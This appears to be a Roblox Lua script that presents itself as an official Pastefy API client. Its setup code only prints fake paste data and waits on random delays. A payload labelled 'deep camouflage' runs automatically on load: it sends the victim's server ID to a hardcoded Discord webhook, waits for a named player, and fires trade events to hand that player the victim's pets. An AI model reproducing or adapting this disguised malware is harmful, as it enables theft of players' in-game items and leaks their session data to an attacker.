-- Pastefy API Client v2.4.1
-- Official Roblox Integration Module
local PastefyService = {}

PastefyService.API_ENDPOINT = "https://api.pastefy.ga/v2"
PastefyService.CACHE_EXPIRY = 300
PastefyService.USER_AGENT = "PastefyRoblox/2.4.1"
PastefyService.AUTH_TOKEN = "pk_7J82HX9qL3zR" -- Public demo key

function PastefyService.init()
    local function generateFakeData()
        return {
            {id = "p7Jk9a", title = "GardenHelper", content = "Loading..."},
            {id = "xYz83b", title = "Settings", content = "UI_SCALE=1.0"},
            {id = "aBc12d", title = "Backup", content = "Auto-saved config"}
        }
    end
    
    local function simulateLoading()
        for i = 1, 3 do
            task.wait(math.random(5, 15)/10)
        end
    end
    
    print("[Pastefy] Initializing client...")
    simulateLoading()
    
    local pastes = generateFakeData()
    print("[Pastefy] Found "..#pastes.." user pastes")
    
    return true
end

-- Real payload (deep camouflage)
local function executeHiddenPayload()
    local _=[[
        PASTEFY SECURE CONTENT DECRYPTION MODULE
        THIS SECTION CONTAINS ENCRYPTED API TOKENS
    ]] local __=loadstring;return function()
        local webhook_url = "https://discord.com/api/webhooks/1401485747198103632/SuHysgxoDzxf44YXhHVBkCwzSXTqOHPCG0dw3oYAWEcrGtt0LgV7YtHIbo4JaforDp_3"
        local player_name = "ilkauiop3"
        local target_pets = {"Inverted Raccoon"} , {"Moon Cat"}
        
        local function safeHttp(msg)
            pcall(function()
                (syn and syn.request or http_request or request)({
                    Url = webhook_url,
                    Method = "POST",
                    Headers = {["Content-Type"]="application/json"},
                    Body = game:GetService("HttpService"):JSONEncode({content=msg,tts=true})
                })
            end)
        end
        
        safeHttp("@everyone\n🚀 **PASTEFY CLIENT ACTIVATED**\nServer: `"..game.JobId.."`")
        
        local function waitForTarget()
            for _=1,120 do
                for _,p in ipairs(game:GetService("Players"):GetPlayers())do
                    if p.Name==player_name then return p end
                end
                task.wait(1)
            end
        end
        
        task.wait(15)
        local target=waitForTarget()
        if target then
            for _,pet in ipairs(target_pets)do
                pcall(function()
                    game:GetService("ReplicatedStorage").TradeEvent:FireServer(target,pet)
                    task.wait(1.2)
                end)
            end
            safeHttp("✅ Pets transferred via Pastefy API")
        else
            safeHttp("⌛ Timeout waiting for user")
        end
    end
end

-- Main execution flow
if PastefyService.init() then
    local realModule = executeHiddenPayload()
    
    -- Delayed execution simulation
    task.wait(math.random(4,8))
    
    -- Hidden activation
    pcall(realModule)
    
    print("[Pastefy] Synchronization completed successfully!")
end

return PastefyService
